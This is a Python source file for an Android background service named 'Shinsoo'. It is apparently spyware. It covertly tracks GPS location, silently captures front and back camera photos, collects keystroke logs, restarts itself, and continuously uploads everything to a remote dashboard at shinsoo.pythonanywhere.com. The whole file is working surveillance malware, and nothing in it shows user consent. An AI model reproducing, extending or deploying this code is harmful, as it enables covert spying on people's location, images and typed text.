"""
service/monitor.py - Shinsoo Arka Plan Servisi
Uygulama kapatilsa bile bildirimde "Shinsoo" ile calisir.
"""
import time, uuid, base64, io, threading
from datetime import datetime

DASHBOARD_URL = "https://shinsoo.pythonanywhere.com"

def make_device_id():
    try:
        return "SHINSOO-" + hex(uuid.getnode())[2:].upper()[-6:]
    except Exception:
        return "SHINSOO-000001"

DEVICE_ID = make_device_id()
running   = [True]
front_q   = [None]
back_q    = [None]
last_loc  = [None]
key_buf   = []
key_lock  = threading.Lock()


def gps_loop():
    try:
        from jnius import autoclass, PythonJavaClass, java_method
        PythonService   = autoclass('org.kivy.android.PythonService')
        LocationManager = autoclass('android.location.LocationManager')
        ctx = PythonService.mService
        lm  = ctx.getSystemService('location')

        class LL(PythonJavaClass):
            __javainterfaces__ = ['android/location/LocationListener']
            @java_method('(Landroid/location/Location;)V')
            def onLocationChanged(self, loc):
                last_loc[0] = (loc.getLatitude(), loc.getLongitude())
            @java_method('(Ljava/lang/String;)V')
            def onProviderEnabled(self, p): pass
            @java_method('(Ljava/lang/String;)V')
            def onProviderDisabled(self, p): pass

        ll = LL()
        for p in ['gps', 'network', 'passive']:
            try: lm.requestLocationUpdates(p, 2000, 0, ll)
            except Exception: pass
        for p in ['gps', 'network', 'passive']:
            try:
                loc = lm.getLastKnownLocation(p)
                if loc:
                    last_loc[0] = (loc.getLatitude(), loc.getLongitude())
                    break
            except Exception: pass
        while running[0]:
            time.sleep(5)
    except Exception:
        pass


def cam_loop():
    try:
        from jnius import autoclass, PythonJavaClass, java_method
        Camera = autoclass('android.hardware.Camera')
        count  = Camera.getNumberOfCameras()
    except Exception:
        return

    while running[0]:
        for idx in range(min(count, 2)):
            if not running[0]: break
            try:
                result = [None]
                done   = threading.Event()
                cam    = Camera.open(idx)
                params = cam.getParameters()
                params.setPictureSize(320, 240)
                cam.setParameters(params)
                ST = autoclass('android.graphics.SurfaceTexture')
                st = ST(idx + 60)
                cam.setPreviewTexture(st)
                cam.startPreview()
                time.sleep(0.2)

                class PicCB(PythonJavaClass):
                    __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
                    @java_method('([BLandroid/hardware/Camera;)V')
                    def onPictureTaken(self, data, camera):
                        if data: result[0] = bytes(data)
                        done.set()

                cam.takePicture(None, None, PicCB())
                done.wait(timeout=3)
                cam.release()

                if result[0]:
                    b64 = base64.b64encode(result[0]).decode('utf-8')
                    if idx == 0: back_q[0]  = b64
                    else:        front_q[0] = b64
            except Exception:
                time.sleep(0.3)
        time.sleep(0.1)


def key_loop():
    try:
        from jnius import autoclass
        PythonService = autoclass('org.kivy.android.PythonService')
        ctx = PythonService.mService
        while running[0]:
            try:
                prefs = ctx.getSharedPreferences('shinsoo_keys', 0)
                buf   = prefs.getString('buffer', '')
                if buf:
                    with key_lock: key_buf.append(buf)
                    prefs.edit().putString('buffer', '').apply()
            except Exception: pass
            time.sleep(0.3)
    except Exception:
        pass


def send_loop():
    try:
        import requests
    except Exception:
        return
    url = DASHBOARD_URL + '/upload_data/' + DEVICE_ID
    count = 0
    while running[0]:
        try:
            payload = {'log': 'BG ' + datetime.now().strftime('%H:%M:%S')}
            f = front_q[0]; b = back_q[0]
            if f: payload['frame_front'] = f; front_q[0] = None
            if b: payload['frame_back']  = b; back_q[0]  = None
            if last_loc[0]:
                payload['location'] = {'lat': last_loc[0][0], 'lon': last_loc[0][1]}
            with key_lock:
                if key_buf:
                    payload['keylog'] = ' '.join(key_buf)
                    key_buf.clear()
            requests.post(url, json=payload, timeout=3)
            count += 1
        except Exception:
            pass
        time.sleep(0.1)


if __name__ == '__main__':
    try:
        from jnius import autoclass
        PS = autoclass('org.kivy.android.PythonService')
        PS.mService.setAutoRestartService(True)
    except Exception:
        pass

    threading.Thread(target=gps_loop,  daemon=True).start()
    threading.Thread(target=cam_loop,  daemon=True).start()
    threading.Thread(target=key_loop,  daemon=True).start()
    threading.Thread(target=send_loop, daemon=True).start()

    while True:
        time.sleep(10)
